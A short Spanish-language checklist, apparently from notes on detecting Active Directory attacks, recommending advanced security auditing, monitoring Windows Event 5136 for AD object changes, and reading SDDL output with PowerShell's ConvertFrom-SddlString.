  - Activar la Política avanzada de auditoría de seguridad.
  - Revisar el Evento 5136 (modificación de objetos en AD) como indicador de ataque.
  - El detalle de cambios se muestra en formato SDDL; usar ConvertFrom-SddlString en PowerShell para interpretarlo de forma legible.




